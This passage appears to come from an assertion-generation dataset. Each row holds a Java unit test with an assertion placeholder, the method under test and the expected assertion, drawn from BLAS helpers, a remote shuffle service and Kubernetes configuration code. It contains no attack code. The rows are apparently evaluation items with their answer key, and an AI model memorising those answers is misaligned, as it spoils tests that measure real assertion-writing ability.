asum(DenseVector x) { return JAVA_BLAS.dasum(x.size(), x.values, 0, 1); }"	assertEquals(15, BLAS.asum(inputDenseVec), TOLERANCE)
"testGemv() { DenseVector anotherDenseVec = Vectors.dense(1.0, 2.0); BLAS.gemv(-2.0, inputDenseMat, false, inputDenseVec, 0.0, anotherDenseVec); double[] expectedResult = new double[] {96.0, -60.0}; ""<AssertPlaceHolder>""; }
gemv( double alpha, DenseMatrix matrix, boolean transMatrix, DenseVector x, double beta, DenseVector y) { Preconditions.checkArgument( transMatrix ? (matrix.numRows() == x.size() && matrix.numCols() == y.size()) : (matrix.numRows() == y.size() && matrix.numCols() == x.size()), ""Matrix and vector size mismatched.""); final String trans = transMatrix ? ""T"" : ""N""; JAVA_BLAS.dgemv( trans, matrix.numRows(), matrix.numCols(), alpha, matrix.values, matrix.numRows(), x.values, 1, beta, y.values, 1); }"	assertArrayEquals(expectedResult, anotherDenseVec.values, TOLERANCE)
"testAllZeroVector() { int n = 4; SparseVector vector = Vectors.sparse(n, new int[0], new double[0]); ""<AssertPlaceHolder>""; }
toArray() { double[] result = new double[n]; for (int i = 0; i < indices.length; i++) { result[indices[i]] = values[i]; } return result; }"	assertArrayEquals(vector.toArray(), new double[n], 1e-5)
"testConvertBetweenHexAndByteArray() { byte[] bytes = CommonUtils.randomBytes(16); String hex = CommonUtils.bytesToHexString(bytes); byte[] decoded = CommonUtils.hexStringToBytes(hex); ""<AssertPlaceHolder>""; }
hexStringToBytes(String hexString) { byte[] bytes = new byte[hexString.length() / 2]; for (int i = 0; i < hexString.length(); i += 2) { byte high = Byte.parseByte(hexString.charAt(i) + """", 16); byte low = Byte.parseByte(hexString.charAt(i + 1) + """", 16); bytes[i / 2] = (byte) ((high << 4) | low); }  return bytes; }"	assertArrayEquals(bytes, decoded)
"Exception { new Context() { { runTest( () -> { final Exception testException = new Exception(""test exception"");  testingLeaderRetrievalDriver.onFatalError(testException);  testingListener.waitForError(timeout); ""<AssertPlaceHolder>""; }); } }; }
onFatalError(Throwable throwable) { synchronized (lock) { if (!running) { LOG.debug(""Ignoring error notification since the service has been stopped.""); return; } leaderListener.handleError(new Exception(throwable)); } }"	"assertTrue( checkNotNull(testingListener.getError()) .getMessage() .contains(""test exception""))"
"Exception { new Context() { { runTest( () -> { final Exception testException = new Exception(""test exception"");  leaderRetrievalService.stop(); testingLeaderRetrievalDriver.onFatalError(testException);  try { testingListener.waitForError(timeout); fail( ""We expect to have a timeout here because there's no error should be passed to listener.""); } catch (TimeoutException ex) { // noop } ""<AssertPlaceHolder>""; }); } }; }
onFatalError(Throwable throwable) { synchronized (lock) { if (!running) { LOG.debug(""Ignoring error notification since the service has been stopped.""); return; } leaderListener.handleError(new Exception(throwable)); } }"	assertThat(testingListener.getError(), is(nullValue()))
"Exception { // test throw exception when receive a registration from a shuffle worker which takes // unmatched // leaderSessionId CompletableFuture<RegistrationResponse> unMatchedLeaderFuture = wronglyFencedGateway.registerWorker( TestShuffleWorkerGateway.createShuffleWorkerRegistration());  try { unMatchedLeaderFuture.get(TIMEOUT, TimeUnit.MILLISECONDS); fail(""Should have failed because we are using a wrongly fenced ShuffleManagerGateway.""); } catch (ExecutionException e) { ""<AssertPlaceHolder>""; } }
registerWorker( ShuffleWorkerRegistration workerRegistration) { CompletableFuture<ShuffleWorkerGateway> shuffleWorkerGatewayFuture = getRpcService() .connectTo(workerRegistration.getRpcAddress(), ShuffleWorkerGateway.class); shuffleWorkerGatewayFutures.put( workerRegistration.getWorkerID(), shuffleWorkerGatewayFuture);  LOG.info(""Shuffle worker {} is registering"", workerRegistration);  return shuffleWorkerGatewayFuture.handleAsync( (ShuffleWorkerGateway shuffleWorkerGateway, Throwable throwable) -> { final InstanceID workerID = workerRegistration.getWorkerID(); if (shuffleWorkerGatewayFuture == shuffleWorkerGatewayFutures.get(workerID)) { shuffleWorkerGatewayFutures.remove(workerID); if (throwable != null) { return new RegistrationResponse.Decline(throwable.getMessage()); } else { return registerShuffleWorkerInternal( shuffleWorkerGateway, workerRegistration); } } else { LOG.debug( ""Ignoring outdated ShuffleWorkerGateway connection for {}."", workerID); return new RegistrationResponse.Decline( ""Decline outdated shuffle worker registration.""); } }, getRpcMainThreadScheduledExecutor()); }"	"assertTrue( ExceptionUtils.stripException(e, ExecutionException.class) .getMessage() .contains(""Fencing token mismatch""))"
"Exception { // test throw exception when receive a registration from shuffle worker which takes invalid // address String invalidAddress = ""/shuffleworker2"";  CompletableFuture<RegistrationResponse> invalidAddressFuture = shuffleManagerGateway.registerWorker( TestShuffleWorkerGateway.createShuffleWorkerRegistration(invalidAddress)); ""<AssertPlaceHolder>""; }
registerWorker( ShuffleWorkerRegistration workerRegistration) { CompletableFuture<ShuffleWorkerGateway> shuffleWorkerGatewayFuture = getRpcService() .connectTo(workerRegistration.getRpcAddress(), ShuffleWorkerGateway.class); shuffleWorkerGatewayFutures.put( workerRegistration.getWorkerID(), shuffleWorkerGatewayFuture);  LOG.info(""Shuffle worker {} is registering"", workerRegistration);  return shuffleWorkerGatewayFuture.handleAsync( (ShuffleWorkerGateway shuffleWorkerGateway, Throwable throwable) -> { final InstanceID workerID = workerRegistration.getWorkerID(); if (shuffleWorkerGatewayFuture == shuffleWorkerGatewayFutures.get(workerID)) { shuffleWorkerGatewayFutures.remove(workerID); if (throwable != null) { return new RegistrationResponse.Decline(throwable.getMessage()); } else { return registerShuffleWorkerInternal( shuffleWorkerGateway, workerRegistration); } } else { LOG.debug( ""Ignoring outdated ShuffleWorkerGateway connection for {}."", workerID); return new RegistrationResponse.Decline( ""Decline outdated shuffle worker registration.""); } }, getRpcMainThreadScheduledExecutor()); }"	assertTrue( invalidAddressFuture.get(TIMEOUT, TimeUnit.MILLISECONDS) instanceof RegistrationResponse.Decline)
"Exception { JobID jobId = randomJobId();  Configuration configuration = new Configuration(); configuration.setMemorySize( StorageOptions.STORAGE_MIN_RESERVED_SPACE_BYTES, MemorySize.ZERO); configuration.setString( ManagerOptions.PARTITION_PLACEMENT_STRATEGY, PartitionPlacementStrategyLoader.MIN_NUM_PLACEMENT_STRATEGY_NAME); AssignmentTrackerImpl assignmentTracker = new AssignmentTrackerImpl(configuration); assignmentTracker.registerJob(jobId);  // Registers two workers RegistrationID worker1 = new RegistrationID(); RegistrationID worker2 = new RegistrationID();  registerWorkerToTracker( assignmentTracker, new InstanceID(""worker1""), worker1, new EmptyShuffleWorkerGateway(), ""worker1"", 1024); registerWorkerToTracker( assignmentTracker, new InstanceID(""worker2""), worker2, new EmptyShuffleWorkerGateway(), ""worker2"", 1026);  MapPartitionID dataPartitionId1 = randomMapPartitionId(); MapPartitionID dataPartitionId2 = randomMapPartitionId();  List<ShuffleResource> allocatedResources = new ArrayList<>(); allocatedResources.add( assignmentTracker.requestShuffleResource( jobId, randomDataSetId(), dataPartitionId1, 2, partitionFactory, null)); allocatedResources.add( assignmentTracker.requestShuffleResource( jobId, randomDataSetId(), dataPartitionId2, 2, partitionFactory, null)); ""<AssertPlaceHolder>""; }
requestShuffleResource( JobID jobID, DataSetID dataSetID, MapPartitionID mapPartitionID, int numberOfConsumers, String dataPartitionFactoryName, String taskLocation) throws ShuffleResourceAllocationException;"	"assertThat( allocatedResources.stream() .map( resource -> ((DefaultShuffleResource) resource) .getMapPartitionLocation()) .collect(Collectors.toList()), containsInAnyOrder( new ShuffleWorkerDescriptor(new InstanceID(""worker1""), ""worker1"", 1024), new ShuffleWorkerDescriptor(new InstanceID(""worker2""), ""worker2"", 1026)))"
"Exception { JobID jobId = randomJobId(); RegistrationID worker1 = new RegistrationID();  AssignmentTracker assignmentTracker = createAssignmentTracker( jobId, worker1, new InstanceID(""worker1""), new EmptyShuffleWorkerGateway());  DataSetID dataSetId = randomDataSetId(); MapPartitionID dataPartitionId = randomMapPartitionId(); ShuffleResource shuffleResource1 = assignmentTracker.requestShuffleResource( jobId, dataSetId, dataPartitionId, 2, partitionFactory, null);  // reallocation the same data partition on the same worker should remain unchanged ShuffleResource shuffleResource2 = assignmentTracker.requestShuffleResource( jobId, dataSetId, dataPartitionId, 2, partitionFactory, null); ""<AssertPlaceHolder>""; }
requestShuffleResource( JobID jobID, DataSetID dataSetID, MapPartitionID mapPartitionID, int numberOfConsumers, String dataPartitionFactoryName, String taskLocation) throws ShuffleResourceAllocationException;"	assertEquals(shuffleResource1, shuffleResource2)
"Exception { Configuration configuration = createConfiguration(); // very high timeout, to ensure that we don't fail because of registration timeouts configuration.setDuration(ClusterOptions.REGISTRATION_TIMEOUT, Duration.ofHours(42)); shuffleWorkerRunner = createShuffleWorkerRunner(configuration);  shuffleWorkerRunner.onFatalError(new RuntimeException(""Test Exception""));  ""<AssertPlaceHolder>""; }
getTerminationFuture() { return terminationFuture; }"	assertEquals( ShuffleWorkerRunner.Result.FAILURE, shuffleWorkerRunner.getTerminationFuture().get())
"Exception { Configuration configuration = createConfiguration(); configuration.setDuration(ClusterOptions.REGISTRATION_TIMEOUT, Duration.ofMillis(10)); shuffleWorkerRunner = createShuffleWorkerRunner(configuration);  ""<AssertPlaceHolder>""; }
getTerminationFuture() { return terminationFuture; }"	assertEquals( ShuffleWorkerRunner.Result.FAILURE, shuffleWorkerRunner.getTerminationFuture().get())
"Exception { Set<String> basePaths = new HashSet<>(); List<DataPartitionStatus> expectedDataPartitions = new ArrayList<>();  for (int i = 0; i < 2; ++i) { File base = TEMP_FOLDER.newFolder(); basePaths.add(base.getAbsolutePath() + ""/""); } LocalShuffleMetaStore metaStore = new LocalShuffleMetaStore(basePaths);  // Adds some partition meta for (String basePath : basePaths) { for (int i = 0; i < 4; ++i) { DataPartitionMeta meta = randomMeta(basePath); metaStore.onPartitionCreated(meta); expectedDataPartitions.add( new DataPartitionStatus( meta.getJobID(), new DataPartitionCoordinate( meta.getDataSetID(), meta.getDataPartitionID()), false)); } }  // Now let's create a new meta store LocalShuffleMetaStore restoredMetastore = new LocalShuffleMetaStore(basePaths); List<DataPartitionStatus> dataPartitionStatus = restoredMetastore.listDataPartitions(); ""<AssertPlaceHolder>""; }
listDataPartitions() { List<DataPartitionStatus> dataPartitionStatuses = new ArrayList<>();  synchronized (dataPartitions) { dataPartitions.forEach( ((coordinate, dataPartitionWorkerStatus) -> { dataPartitionStatuses.add( new DataPartitionStatus( dataPartitionWorkerStatus.getMeta().getJobID(), new DataPartitionCoordinate( dataPartitionWorkerStatus.getMeta().getDataSetID(), dataPartitionWorkerStatus .getMeta() .getDataPartitionID()), dataPartitionWorkerStatus.isReleasing())); })); }  return dataPartitionStatuses; }"	assertThat(dataPartitionStatus, containsInAnyOrder(expectedDataPartitions.toArray()))
"Exception { File base = TEMP_FOLDER.newFolder(); String basePath = base.getAbsolutePath() + ""/""; LocalShuffleMetaStore metaStore = new LocalShuffleMetaStore(Collections.singleton(basePath)); ""<AssertPlaceHolder>""; }
listDataPartitions() { List<DataPartitionStatus> dataPartitionStatuses = new ArrayList<>();  synchronized (dataPartitions) { dataPartitions.forEach( ((coordinate, dataPartitionWorkerStatus) -> { dataPartitionStatuses.add( new DataPartitionStatus( dataPartitionWorkerStatus.getMeta().getJobID(), new DataPartitionCoordinate( dataPartitionWorkerStatus.getMeta().getDataSetID(), dataPartitionWorkerStatus .getMeta() .getDataPartitionID()), dataPartitionWorkerStatus.isReleasing())); })); }  return dataPartitionStatuses; }"	assertEquals(0, metaStore.listDataPartitions().size())
"testGenerateJavaStartCommand() { ProcessMemorySpec memorySpec = new TestingProcessMemorySpec( MemorySize.parse(""32mb""), MemorySize.parse(""64mb""), MemorySize.parse(""128mb""), MemorySize.parse(""256mb""));  String jvmOptions = ""-XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:ParallelGCThreads=4"";  String command = ProcessMemoryUtils.generateJvmArgsStr(memorySpec, jvmOptions);  ""<AssertPlaceHolder>""; }
generateJvmArgsStr(ProcessMemorySpec memorySpec, String jvmExtraOptions) { List<String> commandStrings = new ArrayList<>(); // jvm mem opts commandStrings.add(generateJvmMemArgsStr(memorySpec)); // jvm extra opts commandStrings.add(jvmExtraOptions);  return String.join("" "", commandStrings); }"	"assertThat( command, is( ""-Xmx"" + 32 * 1024 * 1024 + "" -Xms"" + 32 * 1024 * 1024 + "" -XX:MaxDirectMemorySize="" + 64 * 1024 * 1024 + "" -XX:MaxMetaspaceSize="" + 128 * 1024 * 1024 + "" -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:ParallelGCThreads=4""))"
"testLoadConfigurationWithNoneHaMode() { EnvUtils.setEnv(Collections.singletonMap(ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS, ""192.168.1.1"")); Configuration configuration = new Configuration(); configuration.setString(ManagerOptions.RPC_ADDRESS, ""localhost""); configuration.setString(HighAvailabilityOptions.HA_MODE, ""NONE"");  Configuration updatedConfiguration = KubernetesShuffleManagerRunner.loadConfiguration(configuration); ""<AssertPlaceHolder>""; }
loadConfiguration(Configuration conf) { Configuration configuration = new Configuration(conf); if (HaMode.isHighAvailabilityModeActivated(configuration)) { final String ipAddress = System.getenv(ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS); checkState( ipAddress != null, ""ShuffleManager ip address environment variable "" + ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS + "" not set""); configuration.setString(ManagerOptions.RPC_ADDRESS, ipAddress); }  return configuration; }"	"assertThat(updatedConfiguration.getString(ManagerOptions.RPC_ADDRESS), is(""localhost""))"
"testLoadConfigurationWithZooKeeperHaMode() { EnvUtils.setEnv(Collections.singletonMap(ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS, ""192.168.1.1"")); Configuration configuration = new Configuration(); configuration.setString(ManagerOptions.RPC_ADDRESS, ""localhost""); configuration.setString(HighAvailabilityOptions.HA_MODE, ""ZOOKEEPER"");  Configuration updatedConfiguration = KubernetesShuffleManagerRunner.loadConfiguration(configuration); ""<AssertPlaceHolder>""; }
loadConfiguration(Configuration conf) { Configuration configuration = new Configuration(conf); if (HaMode.isHighAvailabilityModeActivated(configuration)) { final String ipAddress = System.getenv(ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS); checkState( ipAddress != null, ""ShuffleManager ip address environment variable "" + ENV_REMOTE_SHUFFLE_POD_IP_ADDRESS + "" not set""); configuration.setString(ManagerOptions.RPC_ADDRESS, ipAddress); }  return configuration; }"	"assertThat(updatedConfiguration.getString(ManagerOptions.RPC_ADDRESS), is(""192.168.1.1""))"
"testToString() { RemoteShuffleApplicationSpec spec = new RemoteShuffleApplicationSpec(dynamicConfigs, fileConfigs); ""<AssertPlaceHolder>""; }
toString() { return ""RemoteShuffleApplicationSpec("" + ""shuffleDynamicConfigs="" + shuffleDynamicConfigs + "", shuffleFileConfigs="" + shuffleFileConfigs + "")""; }"	"assertEquals( spec.toString(), ""RemoteShuffleApplicationSpec("" + ""shuffleDynamicConfigs={key1=value1, key2=value2, key3=value3}, "" + ""shuffleFileConfigs={file2=This is a test for config file., "" + ""file1=This is a test for config file.})"")"
"testToString() { RemoteShuffleApplicationStatus status = new RemoteShuffleApplicationStatus(1, 2, 3, 4); ""<AssertPlaceHolder>""; }
toString() { return ""RemoteShuffleApplicationStatus("" + ""readyShuffleManagers="" + readyShuffleManagers + "", readyShuffleWorkers="" + readyShuffleWorkers + "", desiredShuffleManagers="" + desiredShuffleManagers + "", desiredShuffleWorkers="" + desiredShuffleWorkers + "")""; }"	"assertEquals( status.toString(), ""RemoteShuffleApplicationStatus(readyShuffleManagers=1, readyShuffleWorkers=2, desiredShuffleManagers=3, desiredShuffleWorkers=4)"")"
"testGetNamespace() { conf.setString(KubernetesInternalOptions.NAMESPACE, NAMESPACE); ""<AssertPlaceHolder>""; }
getNamespace() { final String namespace = conf.getString(KubernetesInternalOptions.NAMESPACE); checkArgument( !namespace.trim().isEmpty(), ""Invalid "" + KubernetesInternalOptions.NAMESPACE + ""."");  return namespace; }"	assertThat(testingKubernetesParameters.getNamespace(), is(NAMESPACE))
"testEnablePodHostNetwork() { conf.setBoolean(KubernetesOptions.POD_HOST_NETWORK_ENABLED, true); ""<AssertPlaceHolder>""; }
enablePodHostNetwork() { return conf.getBoolean(KubernetesOptions.POD_HOST_NETWORK_ENABLED); }"	assertThat(testingKubernetesParameters.enablePodHostNetwork(), is(true))
"testGetContainerImage() { conf.setString(KubernetesOptions.CONTAINER_IMAGE, CONTAINER_IMAGE); ""<AssertPlaceHolder>""; }
getContainerImage() { final String containerImage = conf.getString(KubernetesOptions.CONTAINER_IMAGE); checkArgument( !containerImage.trim().isEmpty(), ""Invalid "" + KubernetesOptions.CONTAINER_IMAGE + "".""); return containerImage; }"	assertThat(testingKubernetesParameters.getContainerImage(), is(CONTAINER_IMAGE))
"testGetContainerImagePullPolicy() { conf.setString(KubernetesOptions.CONTAINER_IMAGE_PULL_POLICY, ""Always"");  ""<AssertPlaceHolder>""; }
getContainerImagePullPolicy() { return conf.getString(KubernetesOptions.CONTAINER_IMAGE_PULL_POLICY); }"	"assertThat(testingKubernetesParameters.getContainerImagePullPolicy(), is(""Always""))"
"testGetClusterId() { conf.setString(ClusterOptions.REMOTE_SHUFFLE_CLUSTER_ID, CLUSTER_ID); ""<AssertPlaceHolder>""; }
getClusterId() { final String clusterId = conf.getString(ClusterOptions.REMOTE_SHUFFLE_CLUSTER_ID);  if (StringUtils.isBlank(clusterId)) { throw new IllegalArgumentException( ClusterOptions.REMOTE_SHUFFLE_CLUSTER_ID.key() + "" must not be blank.""); } else if (clusterId.length() > Constants.MAXIMUM_CHARACTERS_OF_CLUSTER_ID) { throw new IllegalArgumentException( ClusterOptions.REMOTE_SHUFFLE_CLUSTER_ID.key() + "" must be no more than "" + Constants.MAXIMUM_CHARACTERS_OF_CLUSTER_ID + "" characters.""); }  return clusterId; }"	assertThat(testingKubernetesParameters.getClusterId(), is(CLUSTER_ID))
"testGetConfigMapName() { ""<AssertPlaceHolder>""; }
getConfigMapName() { return clusterId + ""-configmap""; }"	"assertThat(shuffleFileConfigsParameters.getConfigMapName(), is(CLUSTER_ID + ""-configmap""))"
"testGetData() { Assert.""<AssertPlaceHolder>""; }
getData() { return data; }"	assertEquals(shuffleFileConfigsParameters.getData(), CONFIG_MAP_VOLUME.getItems())
"testGetNamespace() { ""<AssertPlaceHolder>""; }
getNamespace() { return namespace; }"	assertThat(shuffleFileConfigsParameters.getNamespace(), is(NAMESPACE))
"testGetLabels() { ""<AssertPlaceHolder>""; }
getLabels() { final Map<String, String> labels = new HashMap<>(); labels.putAll(KubernetesUtils.getCommonLabels(clusterId)); return Collections.unmodifiableMap(labels); }"	assertEquals(shuffleFileConfigsParameters.getLabels(), getCommonLabels())
"testGetLabels() {  conf.setMap(KubernetesOptions.SHUFFLE_MANAGER_LABELS, USER_LABELS);  final Map<String, String> expectedLabels = new HashMap<>(getCommonLabels()); expectedLabels.put( Constants.LABEL_COMPONENT_KEY, Constants.LABEL_COMPONENT_SHUFFLE_MANAGER); expectedLabels.putAll(USER_LABELS); ""<AssertPlaceHolder>""; }
getLabels() { final Map<String, String> labels = new HashMap<>(); labels.putAll( Optional.ofNullable(conf.getMap(KubernetesOptions.SHUFFLE_MANAGER_LABELS)) .orElse(Collections.emptyMap())); labels.putAll(KubernetesUtils.getCommonLabels(getClusterId())); labels.put(Constants.LABEL_COMPONENT_KEY, Constants.LABEL_COMPONENT_SHUFFLE_MANAGER); return Collections.unmodifiableMap(labels); }"	assertEquals(shuffleManagerParameters.getLabels(), expectedLabels)
"testGetNodeSelector() { conf.setMap(KubernetesOptions.SHUFFLE_MANAGER_NODE_SELECTOR, NODE_SELECTOR); ""<AssertPlaceHolder>""; }
getNodeSelector() { return Optional.ofNullable(conf.getMap(KubernetesOptions.SHUFFLE_MANAGER_NODE_SELECTOR)) .orElse(Collections.emptyMap()); }"	assertEquals(shuffleManagerParameters.getNodeSelector(), NODE_SELECTOR)
"testGetContainerVolumeMounts() { conf.setList(KubernetesOptions.SHUFFLE_MANAGER_HOST_PATH_VOLUMES, HOST_PATH_VOLUMES); ""<AssertPlaceHolder>""; }
getContainerVolumeMounts() {  List<Map<String, String>> volumeMountsConfigs = new ArrayList<>();  // empty dir volume mounts volumeMountsConfigs.addAll( KubernetesUtils.filterVolumesConfigs( conf, KubernetesOptions.SHUFFLE_MANAGER_EMPTY_DIR_VOLUMES, KubernetesUtils::filterVolumeMountsConfigs));  // host path volume mounts volumeMountsConfigs.addAll( KubernetesUtils.filterVolumesConfigs( conf, KubernetesOptions.SHUFFLE_MANAGER_HOST_PATH_VOLUMES, KubernetesUtils::filterVolumeMountsConfigs));  // configmap volume mounts Map<String, String> configmapVolumeMounts = new HashMap<>(); List<ConfigMapVolume> configMapVolumes = getConfigMapVolumes(); if (!configMapVolumes.isEmpty()) { checkState(configMapVolumes.size() == 1); ConfigMapVolume configMapVolume = configMapVolumes.get(0); configmapVolumeMounts.put(Constants.VOLUME_NAME, configMapVolume.getVolumeName()); configmapVolumeMounts.put(Constants.VOLUME_MOUNT_PATH, configMapVolume.getMountPath()); volumeMountsConfigs.add(configmapVolumeMounts); }  return volumeMountsConfigs; }"	assertEquals(shuffleManagerParameters.getContainerVolumeMounts(), CONTAINER_VOLUME_MOUNTS)
"testGetContainerMemoryMB() { ""<AssertPlaceHolder>""; }
getContainerMemoryMB() { return shuffleManagerProcessSpec.getTotalProcessMemorySize().getMebiBytes(); }"	assertThat(shuffleManagerParameters.getContainerMemoryMB(), is(getTotalMemory(false)))
"testGetContainerCPU() { conf.setDouble(KubernetesOptions.SHUFFLE_MANAGER_CPU, CONTAINER_CPU); ""<AssertPlaceHolder>""; }
getContainerCPU() { return conf.getDouble(KubernetesOptions.SHUFFLE_MANAGER_CPU); }"	assertThat(shuffleManagerParameters.getContainerCPU(), is(CONTAINER_CPU))
"testGetResourceLimitFactors() { final Map<String, String> limitFactors = new HashMap<>(); limitFactors.put(""cpu"", ""3.2""); limitFactors.put(""memory"", ""1.6"");  conf.setString(""remote-shuffle.kubernetes.manager.limit-factor.cpu"", ""3.2""); conf.setString(""remote-shuffle.kubernetes.manager.limit-factor.memory"", ""1.6"");  ""<AssertPlaceHolder>""; }
getResourceLimitFactors() { return KubernetesUtils.getPrefixedKeyValuePairs( KubernetesOptions.SHUFFLE_MANAGER_RESOURCE_LIMIT_FACTOR_PREFIX, conf); }"	assertEquals(shuffleManagerParameters.getResourceLimitFactors(), limitFactors)
"testGetDeploymentName() { ""<AssertPlaceHolder>""; }
getDeploymentName() { // The shuffle manager deployment name pattern is {clusterId}-{shufflemanager} return KubernetesUtils.getShuffleManagerNameWithClusterId(getClusterId()); }"	"assertThat( shuffleManagerParameters.getDeploymentName(), is(CLUSTER_ID + ""-shufflemanager""))"
"testGetReplicas() { ""<AssertPlaceHolder>""; }
getReplicas() { return 1; }"	assertThat(shuffleManagerParameters.getReplicas(), is(1))
"testGetLabels() { conf.setMap(KubernetesOptions.SHUFFLE_WORKER_LABELS, USER_LABELS);  final Map<String, String> expectedLabels = new HashMap<>(getCommonLabels()); expectedLabels.put(Constants.LABEL_COMPONENT_KEY, Constants.LABEL_COMPONENT_SHUFFLE_WORKER); expectedLabels.putAll(USER_LABELS); ""<AssertPlaceHolder>""; }
getLabels() { final Map<String, String> labels = new HashMap<>(); labels.putAll( Optional.ofNullable(conf.getMap(KubernetesOptions.SHUFFLE_WORKER_LABELS)) .orElse(Collections.emptyMap())); labels.putAll(KubernetesUtils.getCommonLabels(getClusterId())); labels.put(Constants.LABEL_COMPONENT_KEY, Constants.LABEL_COMPONENT_SHUFFLE_WORKER); return Collections.unmodifiableMap(labels); }"	assertEquals(shuffleWorkerParameters.getLabels(), expectedLabels)
"testGetNodeSelector() { conf.setMap(KubernetesOptions.SHUFFLE_WORKER_NODE_SELECTOR, NODE_SELECTOR); ""<AssertPlaceHolder>""; }
getNodeSelector() { return Optional.ofNullable(conf.getMap(KubernetesOptions.SHUFFLE_WORKER_NODE_SELECTOR)) .orElse(Collections.emptyMap()); }"	assertEquals(shuffleWorkerParameters.getNodeSelector(), NODE_SELECTOR)
"testGetContainerName() { MatcherAssert.""<AssertPlaceHolder>""; }
getContainerName() { return KubernetesUtils.SHUFFLE_WORKER_CONTAINER_NAME; }"	assertThat( shuffleWorkerParameters.getContainerName(), CoreMatchers.is(KubernetesUtils.SHUFFLE_WORKER_CONTAINER_NAME))
"testGetContainerMemoryMB() { ""<AssertPlaceHolder>""; }
getContainerMemoryMB() { return shuffleWorkerProcessSpec.getTotalProcessMemorySize().getMebiBytes(); }"	assertThat(shuffleWorkerParameters.getContainerMemoryMB(), is(getTotalMemory(true)))
"testGetContainerCPU() { conf.setDouble(KubernetesOptions.SHUFFLE_WORKER_CPU, CONTAINER_CPU); ""<AssertPlaceHolder>""; }
getContainerCPU() { return conf.getDouble(KubernetesOptions.SHUFFLE_WORKER_CPU); }"	assertThat(shuffleWorkerParameters.getContainerCPU(), is(CONTAINER_CPU))
"testGetResourceLimitFactors() { final Map<String, String> limitFactors = new HashMap<>(); limitFactors.put(""cpu"", ""3.0""); limitFactors.put(""memory"", ""1.5"");  conf.setString(""remote-shuffle.kubernetes.worker.limit-factor.cpu"", ""3.0""); conf.setString(""remote-shuffle.kubernetes.worker.limit-factor.memory"", ""1.5"");  ""<AssertPlaceHolder>""; }
getResourceLimitFactors() { return KubernetesUtils.getPrefixedKeyValuePairs( KubernetesOptions.SHUFFLE_WORKER_RESOURCE_LIMIT_FACTOR_PREFIX, conf); }"	assertEquals(shuffleWorkerParameters.getResourceLimitFactors(), limitFactors)
"testGetContainerVolumeMounts() { conf.setList(KubernetesOptions.SHUFFLE_WORKER_HOST_PATH_VOLUMES, HOST_PATH_VOLUMES); ""<AssertPlaceHolder>""; }
getContainerVolumeMounts() { List<Map<String, String>> volumeMountsConfigs = new ArrayList<>();  // empty dir volume mounts volumeMountsConfigs.addAll( KubernetesUtils.filterVolumesConfigs( conf, KubernetesOptions.SHUFFLE_WORKER_EMPTY_DIR_VOLUMES, KubernetesUtils::filterVolumeMountsConfigs));  // host path volume mounts volumeMountsConfigs.addAll( KubernetesUtils.filterVolumesConfigs( conf, KubernetesOptions.SHUFFLE_WORKER_HOST_PATH_VOLUMES, KubernetesUtils::filterVolumeMountsConfigs));  // configmap volume mounts Map<String, String> configmapVolumeMounts = new HashMap<>(); List<ConfigMapVolume> configMapVolumes = getConfigMapVolumes(); if (!configMapVolumes.isEmpty()) { checkState(configMapVolumes.size() == 1); ConfigMapVolume configMapVolume = configMapVolumes.get(0); configmapVolumeMounts.put(Constants.VOLUME_NAME, configMapVolume.getVolumeName()); configmapVolumeMounts.put(Constants.VOLUME_MOUNT_PATH, configMapVolume.getMountPath()); volumeMountsConfigs.add(configmapVolumeMounts); }  return volumeMountsConfigs; }"	assertEquals(shuffleWorkerParameters.getContainerVolumeMounts(), CONTAINER_VOLUME_MOUNTS)
"testGetDaemonSetName() { ""<AssertPlaceHolder>""; }
getDaemonSetName() { return KubernetesUtils.getShuffleWorkersNameWithClusterId(getClusterId()); }"	"assertThat(shuffleWorkerParameters.getDaemonSetName(), is(CLUSTER_ID + ""-shuffleworker""))"
"testGetResourceFullName() { HasMetadata resource = new HasMetadata() { @Override public ObjectMeta getMetadata() { return new ObjectMetaBuilder() .withNamespace(""testNamespace"") .withName(""testResource"") .build(); }  @Override public void setMetadata(ObjectMeta objectMeta) {}  @Override public void setApiVersion(String s) {} };  ""<AssertPlaceHolder>""; }
getResourceFullName(HasMetadata resource) { return getNameWithNameSpace( resource.getMetadata().getNamespace(), resource.getMetadata().getName()); }"	"assertThat(KubernetesUtils.getResourceFullName(resource), is(""testNamespace/testResource""))"
"Exception { int numSubpartitions = 10; int bufferSize = 1024; int bufferPoolSize = 1000; Random random = new Random(1111);  // used to store data written to and read from sort buffer for correctness check Queue<DataAndType>[] dataWritten = new Queue[numSubpartitions]; Queue<Buffer>[] buffersRead = new Queue[numSubpartitions]; for (int i = 0; i < numSubpartitions; ++i) { dataWritten[i] = new ArrayDeque<>(); buffersRead[i] = new ArrayDeque<>(); }  int[] numBytesWritten = new int[numSubpartitions]; int[] numBytesRead = new int[numSubpartitions]; Arrays.fill(numBytesWritten, 0); Arrays.fill(numBytesRead, 0);  // fill the sort buffer with randomly generated data int totalBytesWritten = 0; SortBuffer sortBuffer = createSortBuffer( bufferPoolSize, bufferSize, numSubpartitions, getRandomSubpartitionOrder(numSubpartitions)); while (true) { // record size may be larger than buffer size so a record may span multiple segments int recordSize = random.nextInt(bufferSize * 4 - 1) + 1; byte[] bytes = new byte[recordSize];  // fill record with random value random.nextBytes(bytes); ByteBuffer record = ByteBuffer.wrap(bytes);  // select a random subpartition to write int subpartition = random.nextInt(numSubpartitions);  // select a random data type boolean isBuffer = random.nextBoolean() || recordSize > bufferSize; DataType dataType = isBuffer ? DataType.DATA_BUFFER : DataType.EVENT_BUFFER; if (!sortBuffer.append(record, subpartition, dataType)) { sortBuffer.finish(); break; } record.rewind(); dataWritten[subpartition].add(new DataAndType(record, dataType)); numBytesWritten[subpartition] += recordSize; totalBytesWritten += recordSize; }  // read all data from the sort buffer while (sortBuffer.hasRemaining()) { MemorySegment readBuffer = MemorySegmentFactory.allocateUnpooledSegment(bufferSize); SortBuffer.BufferWithChannel bufferAndChannel = sortBuffer.copyIntoSegment(readBuffer, ignore -> {}, 0); int subpartition = bufferAndChannel.getChannelIndex(); buffersRead[subpartition].add(bufferAndChannel.getBuffer()); numBytesRead[subpartition] += bufferAndChannel.getBuffer().readableBytes(); }  ""<AssertPlaceHolder>""; checkWriteReadResult( numSubpartitions, numBytesWritten, numBytesRead, dataWritten, buffersRead); }
numBytes() { return numTotalBytes; }"	assertEquals(totalBytesWritten, sortBuffer.numBytes())
